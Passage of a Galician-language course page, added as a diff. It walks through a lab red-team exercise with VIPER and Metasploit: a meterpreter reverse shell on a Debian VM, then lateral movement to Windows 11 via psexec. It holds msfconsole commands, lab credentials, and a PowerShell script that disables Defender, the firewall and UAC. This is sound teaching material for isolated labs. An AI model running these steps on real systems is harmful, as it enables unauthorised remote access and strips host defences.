+        <li class="md-nav__item">
+  <a href="#resumo" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Resumo
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#conclusion" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Conclusión
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="practica-de-taller-simulacion-de-ataques-con-viper">Práctica de taller: Simulación de Ataques con VIPER</h1>
+<div class="admonition abstract">
+<p class="admonition-title">Antes de empezar</p>
+<p>Esta práctica supón que xa liches os apuntamentos de <a href="../../apuntamentos/viper/" target="_blank"><strong>VIPER, Red Team e C2</strong></a> e de <a href="../../apuntamentos/metasploit/" target="_blank"><strong>Metasploit Framework</strong></a> (o motor que hai debaixo de VIPER: <code>msfconsole</code>, módulos, payloads). Aquí céntrámonos <strong>exclusivamente na simulación de ataques</strong> (Red Team) con VIPER: acceso inicial, movemento lateral e persistencia.</p>
+</div>
+<div class="admonition tip">
+<p class="admonition-title">Montar o escenario automaticamente</p>
+<p>Podes despregar as 3 máquinas deste escenario de forma automatizada con <strong>Packer + VirtualBox</strong>: ver <a href="../../apendice/viper/" target="_blank">Apéndice · Automatización · VIPER</a>. O código do laboratorio está no repositorio <a href="https://github.com/ricardofc/viper-he.lab" target="_blank"><code>ricardofc/viper-he.lab</code></a>.</p>
+</div>
+<h2 id="escenario">Escenario</h2>
+<p><strong>Contorna: 3 máquinas virtuais (VMs) Oracle VirtualBox<br>
+            → 2 máquinas virtuais executando Debian 13: VM-1 e VM-2<br>
+            → 1 máquina virtual executando Microsoft Windows 11: VM-3</strong></p>
+<div style="background-color:yellow;padding:2px;border-radius:15px;margin-bottom:4px;">
+<ul>
+<li><strong>VM-1 (Atacante):</strong><ul>
+<li><strong>Rol:</strong> Servidor de Comando e Control (C2).</li>
+<li><strong>Software Principal:</strong> Instalación base estándar de Debian 13 e <a href="https://viperrtp.com">VIPER</a></li>
+<li><strong>Propósito:</strong> Administrar os payloads/axentes, enviar tarefas e recoller información<br>das máquinas vítimas.</li>
+<li><strong>Rede:</strong><ul>
+<li>NIC1: NAT</li>
+<li>NIC2: Rede Interna → 192.168.120.100/24</li>
+</ul>
+</li>
+<li><strong>CPU:</strong> 2</li>
+<li><strong>RAM:</strong> 4GB</li>
+<li><strong>Disco duro:</strong> 20GB dinámico</li>
+</ul>
+</li>
+</ul>
+</div>
+<div style="background:red;padding:2px;border-radius:15px;margin-bottom:4px;">
+<ul>
+<li><strong>VM-2 (Vítima a través de payload):</strong><ul>
+<li><strong>Rol:</strong> Sistema obxectivo simulado.</li>
+<li><strong>Software Inicial:</strong> Instalación base estándar de Debian 13.</li>
+<li><strong>Acceso:</strong> usuario <code>losada</code> / <code>abc123.</code> (e <code>root</code> / <code>abc123.</code>).</li>
+<li><strong>Propósito:</strong> Executar payload xerado por Viper, o cal establecerá unha conexión<br> de volta (callback) cara á VM Atacante (C2).</li>
+<li><strong>Rede:</strong><ul>
+<li>NIC1: NAT</li>
+<li>NIC2: Rede Interna → 192.168.120.101/24</li>
+</ul>
+</li>
+<li><strong>CPU:</strong> 2</li>
+<li><strong>RAM:</strong> 4GB</li>
+<li><strong>Disco duro:</strong> 20GB dinámico</li>
+</ul>
+</li>
+</ul>
+</div>
+<div style="background:violet;padding:2px;border-radius:15px;margin-bottom:4px;">
+<ul>
+<li><strong>VM-3 (Vítima a través de movemento lateral):</strong><ul>
+<li><strong>Rol:</strong> Sistema obxectivo simulado.</li>
+<li><strong>Software Inicial:</strong> Instalación base estándar de Microsoft Windows 11.</li>
+<li><strong>Propósito:</strong> Executar módulo en Viper, o cal establecerá unha conexión<br>dende VM-2 a esta máquina virtual e de volta (callback) cara á VM Atacante (C2).</li>
+<li><strong>Rede:</strong><ul>
+<li>NIC1: NAT</li>
+<li>NIC2: Rede Interna → 192.168.120.102/24</li>
+</ul>
+</li>
+<li><strong>CPU:</strong> 2</li>
+<li><strong>RAM:</strong> 4GB</li>
+<li><strong>Disco duro:</strong> 20GB dinámico</li>
+</ul>
+</li>
+</ul>
+</div>
+<div class="admonition warning">
+<p class="admonition-title">Tempo execución payload: 30 minutos</p>
+<p>Ver <a href="https://www.viperrtp.com/pricing" target="_blank">VIPER Pricing</a>
+A <strong>versión COMMUNITY</strong> limita cada <strong>sesión</strong> coa vítima a <strong>30 minutos</strong>. Ao rematar, hai que crear outra conexión, cambiando os <strong>PID</strong> dos procesos e os <strong>portos</strong> das conexións. Teno en conta ao reproducir a práctica. (Fundamento en <a href="../../apuntamentos/viper/#viper-limitacion-community" target="_blank">Limitación da versión Community</a>.)</p>
+</div>
+<h2 id="alcance-da-proba">Alcance da proba</h2>
+<ul>
+<li>Simulación de ataques focalizada en sistemas GNU/Linux e Microsoft Windows dentro dunha rede interna corporativa.</li>
+<li>Técnicas utilizadas: <a href="https://www.revshells.com/" target="_blank">Reverse Shell</a>, Movemento Lateral e Persistencia.</li>
+<li>Obxectivo principal: reproducir a cadea de ataque dun Red Team con VIPER.</li>
+</ul>
+<hr />
+<h2 id="vm-1-atacante-instalacion-de-viper">VM-1 Atacante: instalación de VIPER</h2>
+<h3 id="1-requisitos-do-sistema">1. Requisitos do sistema</h3>
+<p>A instalación mínima require <strong>2 vCPU, 4 GB de RAM, 5 GB de disco</strong> e <strong>Linux kernel 5.x+</strong> (aquí <strong>Debian 13</strong>). Detalle en <a href="../../apuntamentos/viper/#viper-requisitos" target="_blank">Requisitos mínimos</a>.</p>
+<h3 id="2-instalacion-de-viper">2. Instalación de VIPER</h3>
+<div class="admonition success">
+<p class="admonition-title">Se montaches o escenario co laboratorio automatizado (recomendado)</p>
+<p>Se creaches as VMs co repositorio <a href="https://github.com/ricardofc/viper-he.lab" target="_blank"><code>ricardofc/viper-he.lab</code></a> (ver <a href="../../apendice/viper/" target="_blank">Apéndice · Automatización · VIPER</a>), <strong>a VM-1 xa ven con VIPER instalado e en execución</strong>: o <em>tuning</em> do sistema, Docker, a imaxe <code>viperplatform/viper</code> e o <code>docker-compose.yml</code> (con <code>restart: always</code>) xa os deixou feitos o seu <code>configure.sh</code>. O escritorio arranca con autologin (<code>viper</code> / <code>abc123.</code>) e hai un atallo <strong>VIPER Dashboard</strong> no escritorio. Neste caso <strong>salta directamente ao punto 3 (Dashboard)</strong>.</p>
+</div>
+<details class="note">
+<summary>Instalación manual de VIPER (só se NON usas o laboratorio automatizado)</summary>
+<p>Se montas a VM-1 a man, segue a guía oficial <a href="https://www.viperrtp.com/guide/getting_start" target="_blank">viperrtp.com/guide/getting_start</a>. En resumo, como <code>root</code>:</p>
+<ol>
+<li>Aplica o <em>tuning</em> de rede (<code>sysctl</code> / <code>ulimit</code>) que recomenda a guía oficial.</li>
+<li>Instala Docker: <code>apt update &amp;&amp; apt -y install docker.io docker-compose</code>.</li>
+<li>Crea <code>/root/VIPER/docker-compose.yml</code> coa imaxe <code>viperplatform/viper:latest</code>, <code>network_mode: "host"</code>, <code>restart: always</code> e <code>command: ["&lt;CONTRASINAL&gt;"]</code> (o contrasinal do login <code>root</code> do dashboard, p. ex. <code>abc123.</code>).</li>
+<li>Levanta o servizo: <code>cd /root/VIPER &amp;&amp; docker-compose up -d</code>.</li>
+</ol>
+<p>O contido exacto deste <code>docker-compose.yml</code> e do <em>tuning</em> está no <code>configure.sh</code> da VM-1 do repositorio: <a href="https://github.com/ricardofc/viper-he.lab/blob/main/vm1-viper-c2/configure.sh" target="_blank"><code>vm1-viper-c2/configure.sh</code></a>.</p>
+</details>
+<hr />
+<h3 id="3-configuracion-do-dashboard-en-viper">3. Configuración do Dashboard en VIPER</h3>
+<p>VIPER ofrece un <strong>Dashboard</strong> web para xestionar ataques e monitorizar operacións (concepto en <a href="../../apuntamentos/viper/#viper-que-e" target="_blank">VIPER: que é e que fai</a>).</p>
+<ol>
+<li>
+<p>Inicia o servidor VIPER:</p>
+<div class="admonition tip">
+<p class="admonition-title">No laboratorio automatizado xa está arrancado</p>
+<p>Se usas a VM-1 de <code>viper-he.lab</code>, VIPER corre en Docker con <code>restart: always</code>, así que <strong>arranca só</strong> en cada inicio da VM (a primeira vez tarda uns minutos). Non precisas executar nada; pasa directamente ao punto 2. Os comandos de abaixo só fan falta nunha instalación manual.</p>
+</div>
+<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="nb">cd</span><span class="w"> </span><span class="nv">$VIPER_DIR</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="c1"># Nota: Asegúrate que Docker está en execución (systemctl start docker)</span>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>docker-compose<span class="w"> </span>up<span class="w"> </span><span class="o">||</span><span class="w"> </span>docker-compose<span class="w"> </span>up<span class="w"> </span>-d<span class="w"> </span><span class="c1"># -d → Executar en segundo plano</span>
+</span></code></pre></div>
+<img alt="Fig. 1: docker-compose up" src="../images/docker-compose-up-viper.png" /></p>
+</li>
+<li>
+<p>Acceder á interface de Viper:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="c1"># O porto por defecto adoita ser 60000 ou similar. Verifica a documentación de VIPER ou os logs de docker.</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>firefox<span class="w"> </span>https://localhost:60000<span class="w"> </span><span class="c1"># Ou a IP do servidor VIPER</span>
+</span></code></pre></div></p>
+</li>
+<li>
+<p>Login — Username: <strong>root</strong> · Password: <strong>abc123.</strong> (ou o que configuraches)</p>
+</li>
+</ol>
+<p><img alt="Fig. 2: Login" src="../images/login.png" /></p>
+<div class="admonition info">
+<p class="admonition-title">Dende o Dashboard podes xestionar os ataques.</p>
+<p>Ao acceder atoparás máquinas na base de datos do propio VIPER, que podes eliminar; aínda que aparezan non afectan ao desenvolvemento da práctica.</p>
+</div>
+<hr />
+<h2 id="exemplo-1">Exemplo 1: Reverse Shell</h2>
+<blockquote>
+<p>Concepto e diagrama en <a href="../../apuntamentos/viper/#tecnica-reverse-shell" target="_blank">Reverse Shell</a>.</p>
+</blockquote>
+<p><img alt="viper - Exemplo1" src="../../apuntamentos/images/viper-exemplo1.png" width="70%" /></p>
+<h4 id="escenario-resumido">Escenario resumido</h4>
+<ul>
+<li><strong><code>VM-1</code> (VIPER)</strong>: <code>192.168.120.100</code> (centro de control, con <code>msfconsole</code>).</li>
+<li><strong><code>VM-2</code> (Debian con payload activo)</strong>: <code>192.168.120.101</code>.</li>
+</ul>
+<h3 id="vm-1-atacante-viper">VM-1 Atacante: VIPER</h3>
+<ol>
+<li>
+<p><strong>Crear un <code>Handler</code> en VIPER</strong> (que é un handler → <a href="../../apuntamentos/viper/#viper-metasploit" target="_blank">Arquitectura sobre Metasploit</a>):</p>
+<ul>
+<li>No Dashboard, vai a <code>Handler&amp;Payload</code>.</li>
+<li>Crea un novo handler, p.ex. <code>linux/x64/meterpreter/reverse_tcp</code> ou <code>windows/x64/meterpreter/reverse_tcp</code> segundo o obxectivo.</li>
+<li>Configura <code>LHOST</code> coa IP do servidor VIPER e <code>LPORT</code> (p.ex. 4444).
+<img alt="Fig. 3: Add Handler" src="../images/add-handler.png" />
+<img alt="Fig. 4: linux/x64/meterpreter_reverse_tcp" src="../images/add-handler-2.png" />
+<em>Sustituír <code>&lt;IP_SERVIDOR_C2&gt;</code> pola IP de Viper.</em>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="c1"># Exemplo para obter a IP</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>$<span class="w"> </span><span class="nv">IP_SERVIDOR_C2</span><span class="o">=</span><span class="k">$(</span>hostname<span class="w"> </span>-I<span class="w"> </span><span class="p">|</span><span class="w"> </span>cut<span class="w"> </span>-d<span class="s1">&#39; &#39;</span><span class="w"> </span>-f2<span class="k">)</span>
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>$<span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="nv">$IP_SERVIDOR_C2</span>
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="m">192</span>.168.120.100<span class="w"> </span><span class="c1"># Exemplo</span>
+</span></code></pre></div></li>
+</ul>
+</li>
+<li>
+<p><strong>Xerar o <code>Payload</code>:</strong></p>
+<ul>
+<li>En <code>Generate Payload</code>, selecciona o handler creado.</li>
+<li>Elixe o formato (<code>elf</code> para Linux, <code>exe</code> para Windows).</li>
+<li>Descarga o payload xerado.
+<img alt="Fig. 5: Generate Payload" src="../images/add-handler-3v2.png" />
+<img alt="Fig. 6: elf" src="../images/add-handler-4.png" width="50%" />
+<img alt="Fig. 7: elf descargado" src="../images/add-handler-5v2.png" /></li>
+</ul>
+</li>
+</ol>
+<h3 id="vm-2-maquina-vitima">VM-2 Máquina vítima</h3>
+<ol>
+<li><strong>Comprometer a máquina vítima (VM-2 Debian):</strong><ul>
+<li>Transfire o payload á vítima (simulando phishing, descarga web, USB…).</li>
+<li>Executa o payload:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="c1"># Na máquina vítima Linux (exemplo)</span>
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>$<span class="w"> </span>chmod<span class="w"> </span>+x<span class="w"> </span>payload_descargado.elf
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>$<span class="w"> </span>./payload_descargado.elf
+</span></code></pre></div>
+<img alt="Fig. 8: permisos e execución" src="../images/add-handler-6v2.png" /></li>
+</ul>
+</li>
+</ol>
+<h3 id="vm-1-atacante-viper_1">VM-1 Atacante: VIPER</h3>
+<ol>
+<li>
+<p><strong>Obter Remote Shell en VIPER:</strong></p>
+<ul>
+<li>No Dashboard verás unha nova sesión (axente) conectada dende a vítima (premer nos segundos de conexión establecidos).
+<img alt="Fig. 9: Remote Shell" src="../images/add-handler-7v2.png" />
+<img alt="Fig. 10: Ver conexión Remote Shell" src="../images/add-handler-7v3.png" /></li>
+</ul>
+</li>
+<li>
+<p><strong>Execución de comandos na máquina comprometida:</strong></p>
+<ul>
+<li>Interactúa coa sesión (clic dereito onde aparecen as IPs de viper e da comprometida).
+<img alt="Fig. 11: Execución shell" src="../images/add-handler-7.png" />
+<img alt="Fig. 12: Execución comandos" src="../images/add-handler-8v2.png" />
+<img alt="Fig. 13: Nova sesión activa en VIPER" src="../images/add-handler-9v2.png" />
+<img alt="Fig. 14: Pivot Graph" src="../images/pivot-graph.png" /></li>
+</ul>
+</li>
+</ol>
+<hr />
+<h2 id="exemplo-2">Exemplo 2: Movemento Lateral (Expandir acceso)</h2>
+<div class="admonition warning">
+<p class="admonition-title">Prerrequisito</p>
+<p>Antes de comezar, realiza o <a href="#exemplo-1"><strong>Exemplo 1: Reverse Shell</strong></a>.</p>
+</div>
+<blockquote>
+<p>Concepto (movemento lateral vs pivoting) e diagrama en <a href="../../apuntamentos/viper/#tecnica-movemento-lateral" target="_blank">Movemento lateral vs. Pivoting</a>.</p>
+</blockquote>
+<p><img alt="viper - Exemplo2" src="../../apuntamentos/images/viper-exemplo2.png" width="45%" /></p>
+<p><em>Asumimos que o atacante xa comprometeu <code>VM-2</code> (Exemplo 1) e quere acceder á <code>VM-3</code> na mesma rede interna.</em></p>
+<h4 id="escenario-resumido_1">Escenario resumido</h4>
+<ul>
+<li><strong><code>VM-1</code> (VIPER)</strong>: <code>192.168.120.100</code>.</li>
+<li><strong><code>VM-2</code> (Debian con payload activo)</strong>: <code>192.168.120.101</code>.</li>
+<li><strong><code>VM-3</code> (Windows 11 Enterprise Evaluation)</strong>: <code>192.168.120.102</code> (portos <code>135</code>, <code>139</code>, <code>445</code>; credenciais <code>usuario/abc123.</code>).</li>
+</ul>
+<h5 id="obxectivo-movemento-lateral-dende-vm-2-cara-vm-3">Obxectivo: movemento lateral dende <code>VM-2</code> cara <code>VM-3</code>.</h5>
+<h5 id="paso-1-acceso-a-vm-2-payload-activo">Paso 1: Acceso á <code>VM-2</code> (payload activo)</h5>
+<div class="admonition tip">
+<p class="admonition-title">Comandos de Metasploit</p>
+<p>A partir de aquí usamos a consola de Metasploit (a lapela <strong>MsfConsole</strong> de VIPER). Se precisas repasar <code>use</code>/<code>set</code>/<code>run</code>, os <em>handlers</em>, <code>psexec</code> ou a xestión de <code>sessions</code>, tes a referencia en <a href="../../apuntamentos/metasploit/#exemplos" target="_blank"><strong>Metasploit Framework → Exemplos</strong></a>.</p>
+</div>
+<p><strong>Dende <code>VM-1</code> (msfconsole - VIPER):</strong>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>use<span class="w"> </span>exploit/multi/handler
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="nb">set</span><span class="w"> </span>payload<span class="w"> </span>linux/x64/meterpreter/reverse_tcp
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="nb">set</span><span class="w"> </span>LHOST<span class="w"> </span><span class="m">192</span>.168.120.100
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="nb">set</span><span class="w"> </span>LPORT<span class="w"> </span><span class="m">4444</span>
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>run
+</span></code></pre></div>
+<img alt="exploit multi handler reverse_tcp 4444" src="../images/viper-msfconsole-444.png" /></p>
+<p><strong>Dende <code>VM-2</code> (Bash - Linux):</strong>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>./1743719330.elf<span class="w"> </span><span class="c1">#payload.elf</span>
+</span></code></pre></div>
+<img alt="reverse_tcp 4444 connected" src="../images/viper-msfconsole-444_2.png" /></p>
+<h5 id="paso-2-movemento-lateral-cara-vm-3">Paso 2: Movemento lateral cara <code>VM-3</code></h5>
+<p>Asumimos que <code>VM-2</code> comunica directamente con <code>VM-3</code> (<code>192.168.120.0/24</code>): só movemento lateral, non pivoting.</p>
+<p><strong>Escaneo de <code>VM-3</code> dende <code>VM-2</code></strong> (dentro dunha consola <code>meterpreter</code>; ao rematar, <code>exit</code> para volver a <code>msfconsole</code>):</p>
+<ol>
+<li>Conectividade + SO por TTL (64→Linux, 128→Windows):
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>ping<span class="w"> </span>-c2<span class="w"> </span><span class="m">192</span>.168.120.102<span class="w"> </span><span class="c1">#TTL&lt;=128 → Windows</span>
+</span></code></pre></div></li>
+<li>Portos TCP abertos:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>nc<span class="w"> </span>-vz<span class="w"> </span><span class="m">192</span>.168.120.102<span class="w"> </span><span class="m">135</span><span class="w"> </span><span class="m">139</span><span class="w"> </span><span class="m">445</span><span class="w"> </span><span class="c1">#Escaneo portos comúns</span>
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="nb">exit</span>
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="nb">exit</span>
+</span></code></pre></div>
+<center><img alt="reverse_tcp 4444 ping nc" src="../images/viper-msfconsole-444_3.png" width="50%" /></center></li>
+</ol>
+<h5 id="paso-3-movemento-lateral-con-psexec-smb">Paso 3: Movemento lateral con <code>psexec</code> (SMB)</h5>
+<div class="admonition danger">
+<p class="admonition-title">Preparación da vítima Windows 11 (só laboratorio)</p>
+<p><code>psexec</code> sube un binario de servizo a <code>ADMIN$</code>, créao e tenta arrancalo. Para que funcione hai que desactivar <strong>UAC</strong>, <strong>firewall</strong> e, sobre todo, a <strong>Protección en tempo real de Windows Defender</strong> (que, se non, pon o binario en corentena → <em>service failed to start - access denied</em>). A imaxe de Packer xa intenta deixalo feito; se a túa VM aínda ten Defender activo, segue estes pasos <strong>na VM-3, como administrador</strong>.</p>
+<p><strong>1. (Unha vez, na interface gráfica) desactivar a Protección contra manipulacións.</strong> En Windows 11 non é scriptable: <em>Seguridad de Windows → Protección antivirus y contra amenazas → Administrar la configuración →</em> desactivar <strong>Protección contra manipulaciones</strong>.</p>
+<p><strong>2. Script de preparación (PowerShell como administrador):</strong>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="c"># --- Windows Defender: desactivar protección en tempo real + exclusión ---</span>
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="nb">Set-MpPreference</span> <span class="n">-DisableRealtimeMonitoring</span> <span class="nv">$true</span>
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="nb">Set-MpPreference</span> <span class="n">-DisableBehaviorMonitoring</span> <span class="nv">$true</span> <span class="n">-ErrorAction</span> <span class="n">SilentlyContinue</span>
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="nb">Set-MpPreference</span> <span class="n">-DisableScriptScanning</span>     <span class="nv">$true</span> <span class="n">-ErrorAction</span> <span class="n">SilentlyContinue</span>
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a><span class="nb">Set-MpPreference</span> <span class="n">-DisableIOAVProtection</span>      <span class="nv">$true</span> <span class="n">-ErrorAction</span> <span class="n">SilentlyContinue</span>
+</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a><span class="nb">Add-MpPreference</span> <span class="n">-ExclusionPath</span> <span class="s2">&quot;C:\&quot;</span>
+</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a><span class="n">reg</span> <span class="n">add</span> <span class="s2">&quot;HKLM\SOFTWARE\Policies\Microsoft\Windows Defender&quot;</span> <span class="p">/</span><span class="n">v</span> <span class="n">DisableAntiSpyware</span> <span class="p">/</span><span class="n">t</span> <span class="n">REG_DWORD</span> <span class="p">/</span><span class="n">d</span> <span class="n">1</span> <span class="p">/</span><span class="n">f</span>
+</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a><span class="n">reg</span> <span class="n">add</span> <span class="s2">&quot;HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection&quot;</span> <span class="p">/</span><span class="n">v</span> <span class="n">DisableRealtimeMonitoring</span> <span class="p">/</span><span class="n">t</span> <span class="n">REG_DWORD</span> <span class="p">/</span><span class="n">d</span> <span class="n">1</span> <span class="p">/</span><span class="n">f</span>
+</span><span id="__span-8-9"><a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a>
+</span><span id="__span-8-10"><a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a><span class="c"># --- Admin remoto con conta local (imprescindible para psexec sen dominio) ---</span>
+</span><span id="__span-8-11"><a id="__codelineno-8-11" name="__codelineno-8-11" href="#__codelineno-8-11"></a><span class="n">reg</span> <span class="n">add</span> <span class="s2">&quot;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System&quot;</span> <span class="p">/</span><span class="n">v</span> <span class="n">LocalAccountTokenFilterPolicy</span> <span class="p">/</span><span class="n">t</span> <span class="n">REG_DWORD</span> <span class="p">/</span><span class="n">d</span> <span class="n">1</span> <span class="p">/</span><span class="n">f</span>
+</span><span id="__span-8-12"><a id="__codelineno-8-12" name="__codelineno-8-12" href="#__codelineno-8-12"></a>
+</span><span id="__span-8-13"><a id="__codelineno-8-13" name="__codelineno-8-13" href="#__codelineno-8-13"></a><span class="c"># --- Firewall OFF nos tres perfís ---</span>
+</span><span id="__span-8-14"><a id="__codelineno-8-14" name="__codelineno-8-14" href="#__codelineno-8-14"></a><span class="n">netsh</span> <span class="n">advfirewall</span> <span class="nb">set </span><span class="n">allprofiles</span> <span class="n">state</span> <span class="n">off</span>
+</span><span id="__span-8-15"><a id="__codelineno-8-15" name="__codelineno-8-15" href="#__codelineno-8-15"></a>
+</span><span id="__span-8-16"><a id="__codelineno-8-16" name="__codelineno-8-16" href="#__codelineno-8-16"></a><span class="c"># --- Compartición SMB (135/139/445) ---</span>
+</span><span id="__span-8-17"><a id="__codelineno-8-17" name="__codelineno-8-17" href="#__codelineno-8-17"></a><span class="nb">Set-Service</span> <span class="n">LanmanServer</span> <span class="n">-StartupType</span> <span class="n">Automatic</span><span class="p">;</span> <span class="nb">Start-Service</span> <span class="n">LanmanServer</span>
+</span><span id="__span-8-18"><a id="__codelineno-8-18" name="__codelineno-8-18" href="#__codelineno-8-18"></a>
+</span><span id="__span-8-19"><a id="__codelineno-8-19" name="__codelineno-8-19" href="#__codelineno-8-19"></a><span class="c"># --- UAC OFF (require reinicio) ---</span>
+</span><span id="__span-8-20"><a id="__codelineno-8-20" name="__codelineno-8-20" href="#__codelineno-8-20"></a><span class="n">reg</span> <span class="n">add</span> <span class="s2">&quot;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System&quot;</span> <span class="p">/</span><span class="n">v</span> <span class="n">EnableLUA</span> <span class="p">/</span><span class="n">t</span> <span class="n">REG_DWORD</span> <span class="p">/</span><span class="n">d</span> <span class="n">0</span> <span class="p">/</span><span class="n">f</span>
+</span></code></pre></div></p>
+<p><strong>3. Comprobar e reiniciar:</strong>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="nb">Get-MpComputerStatus</span> <span class="p">|</span> <span class="nb">Select </span><span class="n">RealTimeProtectionEnabled</span><span class="p">,</span> <span class="n">IsTamperProtected</span>   <span class="c"># RealTimeProtectionEnabled -&gt; False</span>
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="n">shutdown</span> <span class="p">/</span><span class="nb">r </span><span class="p">/</span><span class="n">t</span> <span class="n">0</span>
+</span></code></pre></div></p>
+<p>Estes cambios reducen a seguridade; úsaos só en contornas illadas.</p>
+</div>
+<p><strong>Dende <code>VM-1</code> (msfconsole - VIPER):</strong>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>use<span class="w"> </span>exploit/windows/smb/psexec
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="nb">set</span><span class="w"> </span>RHOSTS<span class="w"> </span><span class="m">192</span>.168.120.102
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a><span class="nb">set</span><span class="w"> </span>SMBUser<span class="w"> </span>usuario
+</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a><span class="nb">set</span><span class="w"> </span>SMBPass<span class="w"> </span>abc123.
+</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a><span class="nb">set</span><span class="w"> </span>LHOST<span class="w"> </span><span class="m">192</span>.168.120.100
+</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a><span class="nb">set</span><span class="w"> </span>LPORT<span class="w"> </span><span class="m">5555</span>
+</span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a><span class="nb">set</span><span class="w"> </span>PAYLOAD<span class="w"> </span>windows/x64/meterpreter/reverse_tcp
+</span><span id="__span-10-8"><a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a>run
+</span></code></pre></div>
+<img alt="Fig. 15: Movemento lateral - psexec" src="../images/psexec-movemento-lateral.png" /></p>
+<h5 id="paso-4-verificar-acceso-a-vm-3">Paso 4: Verificar acceso á <code>VM-3</code></h5>
+<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>background
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>sessions<span class="w"> </span>-l
